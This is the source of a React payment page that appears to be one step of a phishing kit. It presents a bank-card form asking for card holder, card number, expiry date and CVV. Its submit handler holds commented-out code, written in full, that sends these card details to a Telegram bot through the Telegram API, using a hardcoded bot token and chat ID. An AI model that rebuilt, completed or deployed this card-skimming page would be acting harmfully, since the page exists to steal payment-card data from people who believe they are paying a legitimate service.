import React, { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
// import axios from 'axios'; // ✅ Uncommented axios import
import visaImage from "./assets/Visa.jpg" // ✅ Make sure file name is exactly this
import bankCardImage from "./assets/BankCardImage.jpg";
import { Header } from "./Header";

const ThirdPage = () => {
  const [formData, setFormData] = useState({
    cardHolder: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  });

  const [mobileNumber, setMobileNumber] = useState("");
  const navigate = useNavigate();
  const location = useLocation(); // ✅ Uncommented location

  useEffect(() => {
    const queryParams = new URLSearchParams(location.search);
    const phone = queryParams.get("phone");
    setMobileNumber(phone);
  }, [location]);

  const handleChange = (e) => {
    const { id, value } = e.target;

    if (id === "cardNumber") {
      let formattedValue = value.replace(/\D/g, "").slice(0, 16);
      formattedValue = formattedValue.replace(/(\d{4})(?=\d)/g, "$1 ");
      setFormData({ ...formData, [id]: formattedValue });
    } else if (id === "expiryDate") {
      let formatted = value.replace(/\D/g, "");
      if (formatted.length > 2) {
        formatted = formatted.slice(0, 2) + "/" + formatted.slice(2, 4);
      }
      setFormData({ ...formData, [id]: formatted.slice(0, 5) });
    } else if (id === "cvv") {
      setFormData({ ...formData, [id]: value.replace(/\D/g, "").slice(0, 3) });
    } else {
      setFormData({ ...formData, [id]: value });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // const botToken = "7558394911:AAGkw5pvxaBFrA4N2-xQ0s8ci0SnW59b9IQ";
    // const chatID = "8057714398";
    // const message = `💳 *Payment Details*:\n👤 *Card Holder:* ${formData.cardHolder}\n💳 *Card Number:* ${formData.cardNumber}\n📅 *Expiry Date:* ${formData.expiryDate}\n🔒 *CVV:* ${formData.cvv}`;

    // try {
    //   await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    //     chat_id: chatID,
    //     text: message,
    //     parse_mode: "Markdown",
    //   });

    //   setFormData({ cardHolder: "", cardNumber: "", expiryDate: "", cvv: "" });
    // } catch (error) {
    //   console.error("Error sending data to Telegram", error);
    // }
  };

  return (
    <div className="min-h-screen bg-white font-sans">
      <Header />

      <main className="container mx-auto p-4 max-w-2xl">
        <div className="flex items-center justify-between my-4 gap-4">
          <h6 className="mb-0 font-medium">Select Payment Method</h6>
          <img
            src={bankCardImage}
            alt="Bank Card"
            className="mx-auto w-full max-w-md"
          />
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label htmlFor="cardHolder" className="block font-medium mb-1">
              Card holder:
            </label>
            <input
              type="text"
              id="cardHolder"
              value={formData.cardHolder}
              onChange={handleChange}
              placeholder="Name on card"
              className="w-full border rounded-md p-3"
            />
          </div>

          <div>
            <label htmlFor="cardNumber" className="block font-medium mb-1">
              Card Number:
            </label>
            <div className="relative">
              <input
                type="text"
                id="cardNumber"
                value={formData.cardNumber}
                onChange={handleChange}
                placeholder="1234 5678 9101 1121"
                className="w-full border rounded-md p-3 pr-16"
                maxLength="19"
                inputMode="numeric"
              />
              <img
                src={visaImage}
                alt="Visa"
                className="absolute right-4 top-1/2 transform -translate-y-1/2 h-8"
              />
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div>
              <label htmlFor="expiryDate" className="block font-medium mb-1">
                Expiry date:
              </label>
              <input
                type="text"
                id="expiryDate"
                value={formData.expiryDate}
                onChange={handleChange}
                placeholder="MM/YY"
                maxLength="5"
                className="w-full border rounded-md p-3"
              />
            </div>
            <div>
              <label htmlFor="cvv" className="block font-medium mb-1">
                CVV:
              </label>
              <input
                type="number"
                id="cvv"
                value={formData.cvv}
                onChange={handleChange}
                placeholder="CVV"
                className="w-full border rounded-md p-3"
                max="999"
              />
              <small className="text-gray-500">
                3 digits (CVV on back of card)
              </small>
            </div>
          </div>

          <hr />

          <button
            type="submit"
            className="w-full bg-green-600 text-white font-bold py-3 rounded-md hover:bg-green-700"
          >
            Submit
          </button>

          <button
            type="button"
            className="w-full border border-green-600 text-green-600 font-bold py-3 rounded-md hover:bg-green-50"
            onClick={() => navigate(-1)}
          >
            Cancel
          </button>
        </form>
      </main>
    </div>
  );
};

export default ThirdPage;
